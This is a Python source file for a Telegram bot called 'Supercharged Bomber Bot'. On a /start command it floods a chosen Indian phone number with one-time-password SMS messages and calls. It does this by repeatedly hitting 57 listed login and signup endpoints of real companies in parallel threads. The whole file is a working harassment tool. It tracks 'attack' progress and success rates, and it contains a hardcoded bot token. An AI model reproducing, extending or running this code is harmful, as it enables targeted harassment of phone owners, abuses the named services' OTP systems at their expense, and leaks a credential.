import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import sys
import random
import string
import json

# --- CONFIGURATION ---
BOT_TOKEN = "8204938361:AAG6xVMCx87vwzDI1gZlG_blReVRFS4yV3c"
MAX_WORKERS = 50  # More threads for more power
ITERATION_SLEEP = 0.5 # Set to 0 for maximum speed, can be increased to be less aggressive

# --- STATE MANAGEMENT ---
active_bombing_threads = {}
attack_stats = {}

# --- HELPER FUNCTIONS ---
def generate_uuid():
    uuid = ''.join(random.choices(string.hexdigits.lower(), k=32))
    return f"{uuid[:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:20]}-{uuid[20:]}"

def generate_device_id(length=16):
    return ''.join(random.choices(string.hexdigits.lower(), k=length))

def generate_string(length=10):
    return ''.join(random.choices(string.ascii_letters, k=length))

# --- DIRECT API FUNCTIONS (FOR MAXIMUM POWER & RELIABILITY) ---
# Each function handles one API call and returns a tuple: (service_name, success_boolean)

# Original 23 APIs
def send_api_1(p): # Blinkit
    try:
        h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': f'com.grofers.customerapp/280160370 (Linux; U; Cronet/131.0.6738.0)'}
        d = {'country_code': '91', 'otp_mode': 'SMS', 'user_phone': p, 'device_id': generate_device_id()}
        r = requests.post('https://api2.grofers.com/v2/accounts/', headers=h, data=d, timeout=5)
        return ("Blinkit", r.status_code < 300)
    except: return ("Blinkit", False)

def send_api_2(p): # BharatPe
    try:
        r = requests.post('https://api-consumer.bharatpe.in/login/otp/generate', json={'mobile': p, 'hashKey': "jdjeuu673"}, timeout=5)
        return ("BharatPe", r.status_code < 300)
    except: return ("BharatPe", False)

def send_api_3(p): # BigBasket
    try:
        r = requests.post('https://www.bigbasket.com/member-tdl/v3/member/otp/', json={'identifier': p, 'referrer': 'unified_login'}, headers={'x-device-id': generate_device_id()}, timeout=5)
        return ("BigBasket", r.status_code < 300)
    except: return ("BigBasket", False)

def send_api_4(p): # ConfirmTkt
    try:
        r = requests.get('https://securedapi.confirmtkt.com/api/platform/registerOutput', params={'mobileNumber': p, 'newOtp': 'true'}, timeout=5)
        return ("ConfirmTkt", r.status_code < 300)
    except: return ("ConfirmTkt", False)

def send_api_5(p): # CountryDelight
    try:
        r = requests.post('https://api.countrydelight.in/api/v1/customer/requestOtp', json={"mobile_number": p, "mode": "SMS"}, timeout=5)
        return ("CountryDelight", r.status_code < 300)
    except: return ("CountryDelight", False)

def send_api_6(p): # EatSure
    try:
        r = requests.post('https://thanos.faasos.io/v3/customer/generate_otp.json', json={"phone_number": p, "country_code": "IND"}, timeout=5)
        return ("EatSure", r.status_code < 300)
    except: return ("EatSure", False)

def send_api_7(p): # Licious
    try:
        r = requests.post('https://node2.licious.in/api/v2/otp-signup', json={"phone": p}, timeout=5)
        return ("Licious", r.status_code < 300)
    except: return ("Licious", False)

def send_api_8(p): # Park+
    try:
        r = requests.post('https://user-service.parkwheels.co.in/api/v1/user/b2c/otp/send', json={"phone_number": p}, headers={'client-id': '8186c1be-660f-428c-93a7-6480c2d8af66'}, timeout=5)
        return ("Park+", r.status_code < 300)
    except: return ("Park+", False)

def send_api_9(p): # Swiggy
    try:
        r = requests.get(f'https://profile.swiggy.com/api/v3/app/sms_otp?mobile={p}', headers={'User-Agent': 'Swiggy-Android'}, timeout=5)
        return ("Swiggy", r.status_code < 300)
    except: return ("Swiggy", False)

def send_api_10(p): # 1mg_sms
    try:
        r = requests.post('https://api.1mg.com/api/v6/create_token', json={"otp_on_call": False, "number": p}, timeout=5)
        return ("1mg_sms", r.status_code < 300)
    except: return ("1mg_sms", False)

def send_api_11(p): # Zomato
    try:
        r = requests.post('https://accounts.zomato.com/login/phone', data={'number': p, 'country_id': '1'}, timeout=5)
        return ("Zomato", r.status_code < 300)
    except: return ("Zomato", False)

def send_api_12(p): # JustDial
    try:
        r = requests.get('https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php', params={'mobile': p}, timeout=5)
        return ("JustDial", r.status_code < 300)
    except: return ("JustDial", False)

def send_api_13(p): # Porter
    try:
        r = requests.post('https://porter.in/restservice/send_app_link_sms', json={"phone": p}, timeout=5)
        return ("Porter", r.status_code < 300)
    except: return ("Porter", False)

def send_api_14(p): # NNNow
    try:
        r = requests.post('https://api.nnnow.com/d/api/appDownloadLink', json={'mobileNumber': p}, timeout=5)
        return ("NNNow", r.status_code < 300)
    except: return ("NNNow", False)

def send_api_15(p): # Unacademy
    try:
        r = requests.post('https://unacademy.com/api/v1/user/get_app_link/', json={"phone": p}, timeout=5)
        return ("Unacademy", r.status_code < 300)
    except: return ("Unacademy", False)

def send_api_16(p): # Treebo
    try:
        r = requests.post('https://www.treebo.com/api/v2/auth/login/otp/', json={'phone_number': p}, timeout=5)
        return ("Treebo", r.status_code < 300)
    except: return ("Treebo", False)

def send_api_17(p): # PharmEasy
    try:
        r = requests.post('https://pharmeasy.in/api/auth/requestOTP', json={'contactNumber': p}, timeout=5)
        return ("PharmEasy", r.status_code < 300)
    except: return ("PharmEasy", False)

def send_api_18(p): # Dream11
    try:
        r = requests.post('https://api.dream11.com/sendsmslink', data={'mobileNum': p}, timeout=5)
        return ("Dream11", r.status_code < 300)
    except: return ("Dream11", False)

def send_api_19(p): # Paytm
    try:
        r = requests.post('https://commonfront.paytm.com/v4/api/sendsms', json={'phone': p}, timeout=5)
        return ("Paytm", r.status_code < 300)
    except: return ("Paytm", False)

def send_api_20(p): # KFC-IN
    try:
        r = requests.post('https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin', json={'phoneNumber': p}, timeout=5)
        return ("KFC-IN", r.status_code < 300)
    except: return ("KFC-IN", False)

def send_api_21(p): # Myntra_sms
    try:
        r = requests.post('https://api.myntra.com/v1/user/send-otp', json={'mobile': p, 'otpType': 'SMS'}, timeout=5)
        return ("Myntra_sms", r.status_code < 300)
    except: return ("Myntra_sms", False)

def send_api_22(p): # Snapdeal
    try:
        r = requests.post('https://www.snapdeal.com/sendOTP', data={'mobileNumber': p}, timeout=5)
        return ("Snapdeal", r.status_code < 300)
    except: return ("Snapdeal", False)

def send_api_23(p): # Zepto
    try:
        h = {'sessionid': generate_device_id(32), 'deviceuid': generate_device_id(), 'requestid': generate_device_id(32)}
        d = {"signupType": "otp_sms", "data": {"mobile_number": p}}
        r = requests.post('https://api.zepto.co.in/api/v1/user/customer/signup/', headers=h, json=d, timeout=5)
        return ("Zepto", r.status_code < 300)
    except: return ("Zepto", False)

# Newly added APIs from backup.py
def send_api_24(p): # SparIndia
    try:
        data = {"query": "mutation generateCustomerOTP($mobileNumber: String!) { generateCustomerOTP(mobile_number:$mobileNumber ) { otp } }", "variables": {"mobileNumber": p}}
        r = requests.post('https://mcprod.sparindia.com/graphql', json=data, timeout=5)
        return ("SparIndia", r.status_code < 300)
    except: return ("SparIndia", False)

def send_api_25(p): # 1mg_call
    try:
        r = requests.post('https://api.1mg.com/api/v6/create_token', json={"otp_on_call": True, "number": p}, timeout=5)
        return ("1mg_call", r.status_code < 300)
    except: return ("1mg_call", False)

def send_api_26(p): # Bisleri
    try:
        data = {'mobile': p, 'name': generate_string(6), 'email': f'{generate_string(10)}@gmail.com'}
        r = requests.post('https://apis.bisleri.com/send-otp', json=data, timeout=5)
        return ("Bisleri", r.status_code < 300)
    except: return ("Bisleri", False)

def send_api_27(p): # CityMall
    try:
        r = requests.post('https://cf.citymall.live/api/cl-user/auth/get-otp', json={'phone_number': p}, timeout=5)
        return ("CityMall", r.status_code < 300)
    except: return ("CityMall", False)

def send_api_28(p): # DealShare
    try:
        data = {'phoneNumber': p, 'name': p, 'deviceId': generate_device_id()}
        r = requests.post('https://services.dealshare.in/userservice/api/v1/user-login/send-login-code', json=data, timeout=5)
        return ("DealShare", r.status_code < 300)
    except: return ("DealShare", False)

def send_api_29(p): # Lenskart
    try:
        data = {'phoneCode': '+91', 'telephone': p}
        r = requests.post('https://api-gateway.juno.lenskart.com/v3/customers/sendOtp', json=data, timeout=5)
        return ("Lenskart", r.status_code < 300)
    except: return ("Lenskart", False)

def send_api_30(p): # GlowRoad
    try:
        r = requests.post('https://app.glowroad.com/api/generateotp', json={'mobile': p}, timeout=5)
        return ("GlowRoad", r.status_code < 300)
    except: return ("GlowRoad", False)

def send_api_31(p): # SouledStore
    try:
        data = {'telephone': p, 'firstname': generate_string(6), 'lastname': generate_string(6)}
        r = requests.post('https://api.thesouledstore.com/api/v2/register-otp', json=data, timeout=5)
        return ("SouledStore", r.status_code < 300)
    except: return ("SouledStore", False)

def send_api_32(p): # Asort
    try:
        r = requests.post('https://prod-ds-express.asort.com/api/v1/m/auth/signup', json={"mobile": p, "name": generate_string(6)}, timeout=5)
        return ("Asort", r.status_code < 300)
    except: return ("Asort", False)

def send_api_33(p): # AllenSolly
    try:
        r = requests.post('https://www.allensolly.com/capillarylogin/validateMobileOrEMail', data={'mobileoremail': p}, timeout=5)
        return ("AllenSolly", r.status_code < 300)
    except: return ("AllenSolly", False)

def send_api_34(p): # Frotels
    try:
        r = requests.post('https://www.frotels.com/appsendsms.php', data={'mobno': p}, timeout=5)
        return ("Frotels", r.status_code < 300)
    except: return ("Frotels", False)

def send_api_35(p): # Gapoon
    try:
        r = requests.post('https://www.gapoon.com/userSignup', data={'mobile': p, 'name': 'Gemini'}, timeout=5)
        return ("Gapoon", r.status_code < 300)
    except: return ("Gapoon", False)

def send_api_36(p): # Housing
    try:
        r = requests.post('https://login.housing.com/api/v2/send-otp', data={'phone': p}, timeout=5)
        return ("Housing", r.status_code < 300)
    except: return ("Housing", False)

def send_api_37(p): # Cityflo
    try:
        r = requests.post('https://cityflo.com/website-app-download-link-sms/', data={'mobile_number': p}, timeout=5)
        return ("Cityflo", r.status_code < 300)
    except: return ("Cityflo", False)

def send_api_38(p): # Ajio
    try:
        data = {'mobileNumber': p, 'firstName': 'Guest', 'login': f'{generate_string(10)}@gmail.com', 'requestType': 'SENDOTP'}
        r = requests.post('https://login.web.ajio.com/api/auth/signupSendOTP', json=data, timeout=5)
        return ("Ajio", r.status_code < 300)
    except: return ("Ajio", False)

def send_api_39(p): # HappyEasyGo
    try:
        r = requests.get('https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do', params={'phone': f'91 {p}'}, timeout=5)
        return ("HappyEasyGo", r.status_code < 300)
    except: return ("HappyEasyGo", False)

def send_api_40(p): # Airtel
    try:
        r = requests.get('https://www.airtel.in/referral-api/core/notify', params={'rtn': p}, timeout=5)
        return ("Airtel", r.status_code < 300)
    except: return ("Airtel", False)

def send_api_41(p): # MylesCars
    try:
        r = requests.post('https://www.mylescars.com/usermanagements/chkContact', data={'contactNo': p}, timeout=5)
        return ("MylesCars", r.status_code < 300)
    except: return ("MylesCars", False)

def send_api_42(p): # Grofers
    try:
        r = requests.post('https://grofers.com/v2/accounts/', data={'user_phone': p}, timeout=5)
        return ("Grofers", r.status_code < 300)
    except: return ("Grofers", False)

def send_api_43(p): # Cashify
    try:
        r = requests.get('https://www.cashify.in/api/cu01/v1/app-link', params={'mn': p}, timeout=5)
        return ("Cashify", r.status_code < 300)
    except: return ("Cashify", False)

def send_api_44(p): # IndiaLends
    try:
        r = requests.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', data={'jfsdfu14hkgertd': p}, timeout=5)
        return ("IndiaLends", r.status_code < 300)
    except: return ("IndiaLends", False)

def send_api_45(p): # Flipkart
    try:
        r = requests.post('https://www.flipkart.com/api/5/user/otp/generate', data={'loginId': f'+91{p}'}, timeout=5)
        return ("Flipkart", r.status_code < 300)
    except: return ("Flipkart", False)

def send_api_46(p): # RedBus
    try:
        r = requests.get('https://m.redbus.in/api/getOtp', params={'number': p, 'cc': '91'}, timeout=5)
        return ("RedBus", r.status_code < 300)
    except: return ("RedBus", False)

def send_api_47(p): # NewtonSchools
    try:
        r = requests.post('https://my.newtonschool.co/api/v1/user/otp/', json={'phone': f'+91{p}'}, timeout=5)
        return ("NewtonSchools", r.status_code < 300)
    except: return ("NewtonSchools", False)

def send_api_48(p): # TataDigital_call
    try:
        r = requests.post('https://api.tatadigital.com/api/v2/otp/voice', json={'phoneNumber': p}, timeout=5)
        return ("TataDigital_call", r.status_code < 300)
    except: return ("TataDigital_call", False)

def send_api_49(p): # HeroCycles_call
    try:
        r = requests.post('https://api.herocycles.com/api/v1/otp/send', json={'mobile': p, 'otp_type': 'call'}, timeout=5)
        return ("HeroCycles_call", r.status_code < 300)
    except: return ("HeroCycles_call", False)

def send_api_50(p): # Myntra_call
    try:
        r = requests.post('https://api.myntra.com/v1/user/send-otp', json={'mobile': p, 'otpType': 'CALL'}, timeout=5)
        return ("Myntra_call", r.status_code < 300)
    except: return ("Myntra_call", False)

def send_api_51(p): # Vodafone_sms
    try:
        r = requests.post('https://api.vodafone.in/api/v1/otp/send', json={'msisdn': f'+91{p}', 'type': 'sms'}, timeout=5)
        return ("Vodafone_sms", r.status_code < 300)
    except: return ("Vodafone_sms", False)

def send_api_52(p): # Vodafone_call
    try:
        r = requests.post('https://api.vodafone.in/api/v1/otp/send', json={'msisdn': f'+91{p}', 'type': 'call'}, timeout=5)
        return ("Vodafone_call", r.status_code < 300)
    except: return ("Vodafone_call", False)

def send_api_53(p): # JioMart_call
    try:
        r = requests.post('https://www.jiomart.com/customer/account/otp', json={'mobile': p, 'otp_channel': 'call'}, timeout=5)
        return ("JioMart_call", r.status_code < 300)
    except: return ("JioMart_call", False)

def send_api_54(p): # BookMyShow_sms
    try:
        r = requests.post('https://api.bookmyshow.com/v1/auth/otp', json={'mobile': f'91{p}', 'type': 'sms'}, timeout=5)
        return ("BookMyShow_sms", r.status_code < 300)
    except: return ("BookMyShow_sms", False)

def send_api_55(p): # BookMyShow_call
    try:
        r = requests.post('https://api.bookmyshow.com/v1/auth/otp', json={'mobile': f'91{p}', 'type': 'call'}, timeout=5)
        return ("BookMyShow_call", r.status_code < 300)
    except: return ("BookMyShow_call", False)

def send_api_56(p): # Amazon_sms
    try:
        r = requests.post('https://www.amazon.in/ap/signin/otp', data={'mobileNumber': f'+91{p}', 'otpType': 'SMS'}, timeout=5)
        return ("Amazon_sms", r.status_code < 300)
    except: return ("Amazon_sms", False)

def send_api_57(p): # Amazon_call
    try:
        r = requests.post('https://www.amazon.in/ap/signin/otp', data={'mobileNumber': f'+91{p}', 'otpType': 'CALL'}, timeout=5)
        return ("Amazon_call", r.status_code < 300)
    except: return ("Amazon_call", False)


# --- CORE ATTACK LOGIC ---
def get_attack_functions():
    """Returns a list of all individual API attack functions."""
    return [
        send_api_1, send_api_2, send_api_3, send_api_4, send_api_5, send_api_6, send_api_7,
        send_api_8, send_api_9, send_api_10, send_api_11, send_api_12, send_api_13, send_api_14,
        send_api_15, send_api_16, send_api_17, send_api_18, send_api_19, send_api_20,
        send_api_21, send_api_22, send_api_23, send_api_24, send_api_25, send_api_26,
        send_api_27, send_api_28, send_api_29, send_api_30, send_api_31, send_api_32,
        send_api_33, send_api_34, send_api_35, send_api_36, send_api_37, send_api_38,
        send_api_39, send_api_40, send_api_41, send_api_42, send_api_43, send_api_44,
        send_api_45, send_api_46, send_api_47, send_api_48, send_api_49, send_api_50,
        send_api_51, send_api_52, send_api_53, send_api_54, send_api_55, send_api_56, send_api_57
    ]

def continuous_bombing_loop(chat_id, phone_number, stop_event):
    """The main loop for continuous bombing, now with reliable statistics."""
    attack_functions = get_attack_functions()
    
    while not stop_event.is_set():
        print(f"[*] Running attack wave for {phone_number} (Chat: {chat_id})")
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(func, phone_number) for func in attack_functions]
            results = [f.result() for f in futures]
        
        if chat_id in attack_stats:
            stats = attack_stats[chat_id]
            for service, success in results:
                stats['total'] += 1
                if success:
                    stats['success'] += 1
                    stats['success_details'][service] = stats['success_details'].get(service, 0) + 1
                else:
                    stats['failed'] += 1
                    stats['failed_details'][service] = stats['failed_details'].get(service, 0) + 1

        if ITERATION_SLEEP > 0:
            time.sleep(ITERATION_SLEEP)

    print(f"[*] Attack loop stopped for {phone_number} (Chat: {chat_id})")

# --- TELEGRAM BOT ---
def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to {chat_id}: {e}")

def telegram_bot_poller():
    last_update_id = 0
    print("[+] Supercharged Bomber Bot is now online!")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=30"
            response = requests.get(url, timeout=40)
            updates = response.json()

            for update in updates.get("result", []):
                last_update_id = update["update_id"]
                if not (message := update.get("message")) or not (text := message.get("text")):
                    continue

                chat_id = message["chat"]["id"]
                text = text.strip().lower()

                if text.startswith("/start"):
                    parts = text.split()
                    if len(parts) == 2 and parts[1].isdigit() and (len(parts[1]) == 10 or (parts[1].startswith("91") and len(parts[1]) == 12)):
                        phone_number = parts[1]
                        if len(phone_number) == 12:
                           phone_number = phone_number[2:] # Strip +91 if present

                        if chat_id in active_bombing_threads:
                            send_telegram_message(chat_id, "⚠️ Attack already running. Use `/stop` first.")
                        else:
                            print(f"[*] Starting attack for {chat_id} on {phone_number}")
                            stop_event = threading.Event()
                            attack_stats[chat_id] = {
                                'success': 0, 'failed': 0, 'total': 0,
                                'target': phone_number, 'start_time': time.time(),
                                'success_details': {}, 'failed_details': {}
                            }
                            active_bombing_threads[chat_id] = stop_event
                            
                            bomb_thread = threading.Thread(target=continuous_bombing_loop, args=(chat_id, phone_number, stop_event))
                            bomb_thread.daemon = True
                            bomb_thread.start()
                            
                            send_telegram_message(chat_id, f"✅ *Attack initiated on `{phone_number}`!*\n\nUse `/status` to check progress.\nUse `/stop` to halt the attack.")
                    else:
                        send_telegram_message(chat_id, "Invalid command format.\nUsage: `/start <10-digit-number>`")
                
                elif text.startswith("/stop"):
                    if chat_id in active_bombing_threads:
                        print(f"[*] Stopping attack for {chat_id}")
                        active_bombing_threads[chat_id].set()
                        del active_bombing_threads[chat_id]
                        
                        final_stats = attack_stats.get(chat_id)
                        if final_stats:
                            elapsed_time = time.time() - final_stats['start_time']
                            status_text = (
                                f"🛑 *Attack Stopped for `{final_stats['target']}`*\n\n"
                                f"*--- Final Report ---*\n"
                                f"Duration: `{int(elapsed_time)}s`\n"
                                f"Total Requests: `{final_stats['total']}`\n"
                                f"✅ Successful: `{final_stats['success']}`\n"
                                f"❌ Failed: `{final_stats['failed']}`"
                            )
                            send_telegram_message(chat_id, status_text)
                            del attack_stats[chat_id]
                        else:
                            send_telegram_message(chat_id, "🛑 Attack stopped.")
                    else:
                        send_telegram_message(chat_id, "🤷‍♂️ No active attack to stop.")

                elif text.startswith("/status"):
                    if chat_id in attack_stats:
                        stats = attack_stats[chat_id]
                        elapsed_time = time.time() - stats['start_time']
                        
                        # Avoid division by zero
                        rps = (stats['total'] / elapsed_time) if elapsed_time > 0 else 0
                        success_rate = (stats['success'] / stats['total'] * 100) if stats['total'] > 0 else 0
                        
                        # Get top 5 successful and failed services
                        top_success = sorted(stats['success_details'].items(), key=lambda item: item[1], reverse=True)[:5]
                        top_failed = sorted(stats['failed_details'].items(), key=lambda item: item[1], reverse=True)[:5]

                        success_str = "\n".join([f"  - `{svc}`: {cnt}" for svc, cnt in top_success]) if top_success else "  (none yet)"
                        failed_str = "\n".join([f"  - `{svc}`: {cnt}" for svc, cnt in top_failed]) if top_failed else "  (none yet)"

                        status_text = (
                            f"📊 *Live Attack Status for `{stats['target']}`*\n\n"
                            f"⏳ Elapsed Time: `{int(elapsed_time)}s`\n"
                            f"🚀 Requests/sec: `{rps:.2f}`\n"
                            f"📈 Success Rate: `{success_rate:.2f}%`\n\n"
                            f"*--- Totals ---*\n"
                            f"✅ Successful: `{stats['success']}`\n"
                            f"❌ Failed: `{stats['failed']}`\n"
                            f"📬 Total: `{stats['total']}`\n\n"
                            f"*--- Top 5 Successful Services ---*\n{success_str}\n\n"
                            f"*--- Top 5 Failed Services ---*\n{failed_str}"
                        )
                        send_telegram_message(chat_id, status_text)
                    else:
                        send_telegram_message(chat_id, "No attack running. Use `/start` to begin.")

                elif text.startswith("/help"):
                    help_text = (
                        "**🔥 Supercharged Bomber Bot 🔥**\n\n"
                        "Commands:\n"
                        "`/start <number>` - Start an attack.\n"
                        "  *Example:* `/start 9876543210`\n\n"
                        "`/stop` - Stop the current attack.\n\n"
                        "`/status` - Show live, detailed attack statistics.\n\n"
                        "`/help` - Shows this help message."
                    )
                    send_telegram_message(chat_id, help_text)

        except requests.exceptions.RequestException as e:
            print(f"Network error in poller: {e}. Retrying in 15s.")
            time.sleep(15)
        except Exception as e:
            print(f"CRITICAL ERROR in poller: {e}. Restarting loop in 15s.")
            time.sleep(15)

if __name__ == "__main__":
    telegram_bot_poller()
